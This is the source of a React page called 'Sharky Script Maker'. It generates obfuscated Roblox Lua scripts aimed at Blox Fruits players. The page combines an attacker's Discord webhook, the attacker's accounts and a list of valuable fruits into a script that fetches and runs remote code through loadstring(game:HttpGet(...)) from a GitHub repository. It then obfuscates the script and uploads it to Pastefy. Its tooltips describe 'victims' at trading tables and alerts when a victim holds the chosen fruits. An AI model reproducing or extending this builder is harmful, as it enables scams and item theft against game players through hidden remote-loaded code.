'use client';

import {useState, useEffect, useRef} from 'react';
import {Button} from '@/components/ui/button';
import {Textarea} from '@/components/ui/textarea';
import {Checkbox} from '@/components/ui/checkbox';
import {Label} from '@/components/ui/label';
import {Input} from '@/components/ui/input';
import {Download, Copy, HelpCircle} from 'lucide-react';
import {useToast} from '@/hooks/use-toast';

import {useTransition} from 'react';
import {obfuscateScript} from '@/ai/flows/obfuscate-script';

import ParticleComponent from '@/components/ParticleComponent';

import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip"
import {useIsMobile} from "@/hooks/use-mobile";


// Define fruit arrays
const mythicalFruits = [
  'Kitsune-Kitsune',
  'Yeti-Yeti',
  'Gas-Gas',
  'Leopard-Leopard',
  'Control-Control',
  'Dough-Dough',
  'T-Rex-T-Rex',
  'Spirit-Spirit',
  'Mammoth-Mammoth',
  'Venom-Venom',
];
const legendaryFruits = [
  'Portal-Portal',
  'Buddha-Buddha',
  'Rumble-Rumble',
  'Shadow-Shadow',
  'Blizzard-Blizzard',
  'Sound-Sound',
  'Phoenix-Phoenix',
  'Pain-Pain',
  'Gravity-Gravity',
  'Love-Love',
  'Spider-Spider',
  'Quake-Quake',
];
const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
const defaultSelectedFruits = ['Kitsune-Kitsune', 'Leopard-Leopard', 'Yeti-Yeti', 'Gas-Gas'];

export default function Home() {
  // Define state variables
  const [webhookUrl, setWebhookUrl] = useState(''); // Stores the webhook URL
  const [usernames, setUsernames] = useState(''); // Stores usernames, one per line
  const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits); // Stores the selected fruits
  const [configuredScript, setConfiguredScript] = useState(''); // Stores the generated (unobfuscated) script
  const [obfuscatedScript, setObfuscatedScript] = useState(''); // Stores the obfuscated script
  const [pastefyLink, setPastefyLink] = useState('');// Stores the pastefy link
  const {toast} = useToast(); // Toast function for displaying notifications
  const [isPending, startTransition] = useTransition(); // Manages asynchronous transitions
    const isMobile = useIsMobile(); // Hook to check if the device is mobile
    const [tooltipStates, setTooltipStates] = useState({
        webhookUrl: false,
        usernames: false,
        fruitsToHit: false,
    });

    const toggleTooltip = (field: string) => {
        if (isMobile) {
            setTooltipStates(prevState => ({
                ...Object.fromEntries(
                    Object.keys(prevState).map(key => [key, false])
                ),
                [field]: !prevState[field],
            }));
        }
    };

  const isGenerating = isPending; // Determines if the script generation is in progress

    const isValidWebhookURL = (url: string): boolean => {
        return url.startsWith("https://sharky-on-top.script-config-protector.workers.dev/w/");
    };

  // Function to generate script
  const generateScript = async () => {
    try {
        if (!isValidWebhookURL(webhookUrl)) {
            toast({
                title: "Error",
                description: "Invalid URL, make sure to Protect your Discord Webhook URL with https://sharkyontop.pages.dev/",
                variant: "destructive",
            });
            return;
        }
      // Construct script based on user inputs
      let script = `Webhook = "${webhookUrl}" -- << Discord Webhook Here\n`;
      script += `Usernames = {${usernames
        .split('\n')
        .map(user => `"${user}"`)
        .join(', ')}} -- << Your usernames here, you can add as many alts as you want\n`;
      script += `FruitsToHit = {${selectedFruits.map(fruit => `"${fruit}"`).join(', ')}} -- << Fruits you want the script to detect\n`;
      script += `loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;

      setConfiguredScript(script);

      startTransition(async () => {
        try {
          const obfuscationResult = await obfuscateScript({script: script});
          setObfuscatedScript(obfuscationResult.obfuscatedScript);
          setPastefyLink(obfuscationResult.pastefyLink);

          toast({
            title: 'Script Generated!',
            description: 'Script generated and obfuscated successfully.',
          });
        } catch (error: any) {
          console.error("Error during obfuscation:", error);
          toast({
            title: 'Error',
            description: `Failed to generate script: ${error.message}`,
            variant: 'destructive',
          });
        }
      });
    } catch (error: any) {
      toast({
        title: 'Error',
        description: `Failed to generate script: ${error.message}`,
        variant: 'destructive',
      });
    }
  };

  // Function to handle fruit selection
  const handleFruitSelect = (fruit: string) => {
    setSelectedFruits(prev => {
      if (prev.includes(fruit)) {
        return prev.filter(f => f !== fruit);
      } else {
        return [...prev, fruit];
      }
    });
  };

  // Function to download script
  const downloadScript = () => {
    if (!obfuscatedScript) {
      toast({
        title: 'Error',
        description: 'Please generate a script first.',
        variant: 'destructive',
      });
      return;
    }

    const blob = new Blob([obfuscatedScript], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.href = url;
    a.download = 'roblox_script.lua';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  // Function to copy configured script
  const copyConfiguredScript = async () => {
    if (configuredScript) {
      await navigator.clipboard.writeText(configuredScript);
      toast({
        title: 'Copied!',
        description: 'Configured script copied to clipboard.',
      });
    } else {
      toast({
        title: 'Error',
        description: 'No configured script to copy.',
        variant: 'destructive',
      });
    }
  };

  // Function to copy obfuscated script
  const copyObfuscatedScript = async () => {
    if (obfuscatedScript) {
      await navigator.clipboard.writeText(obfuscatedScript);
      toast({
        title: 'Copied!',
        description: 'Obfuscated script copied to clipboard.',
      });
    } else {
      toast({
        title: 'Error',
        description: 'No obfuscated script to copy.',
        variant: 'destructive',
      });
    }
  };

  return (
    <>
      
      
        
           
              Sharky Script Maker
           
            
                Protected Webhook URL
                
                  
                    
                      
                        
                          
                            
                              Enter your 
                              
                               Protected Discord Webhook URL
                              
                               to receive notifications when the script detects a fruit.
                            
                            
                              The webhook URL should be a valid Discord webhook URL that you have
                              
                               protected
                              
                               using our
                              
                               <a href="https://sharkyontop.pages.dev/" target="_blank" rel="noopener noreferrer" className="text-blue-500 hover:underline">protector
                                (click here to protect)
                              </a>
                              .
                            
                            
                              This allows the script to send messages to your Discord channel.
                            
                          
                        
                      
                    
                  
                
              
              
                
              
            
            
                Usernames (one per line)
                
                  
                    
                      
                        
                          
                            
                              Enter usernames of 
                              
                               YOUR
                              
                               accounts.
                            
                            
                              These will be the accounts that can use the script's commands.
                            
                            
                              They will also be the ones sitting in trading tables with victims.
                            
                            
                              Put one Roblox username per line, with 
                              
                               no spaces
                              
                              .
                            
                          
                        
                      
                    
                  
                
              
              
                
              
            
            
                Fruits to Hit
                
                  
                    
                      
                        
                          
                            
                              Select the fruits you want the script to detect.
                            
                            
                              You will get notified through your webhook on Discord if victim has any of the selected fruits in their inventory,
                            
                          
                        
                      
                    
                  
                
              
            
            
              
                
                  {sortedFruitsByRarity.map(fruit => (
                    
                     
                       
                         
                           
                         
                         {fruit}
                       
                     
                    
                  ))}
                
              
            
            
              
                {isGenerating ? 'Generating...' : 'Generate Script'}
              
            
            
              
                Configured Script
                
                  
                    
                      {configuredScript}
                    
                    
                      
                    
                  
                
              
            
            
              
                Obfuscated Script
                
                  
                     
                       Pastefy Link:
                      
                        {pastefyLink}
                      
                     
                  
                
                
                  
                    
                      {obfuscatedScript}
                    
                    
                      
                    
                  
                
              
            
            
              
                
                  Download Script
                
              
            
          
        
      
    </>
  );
}
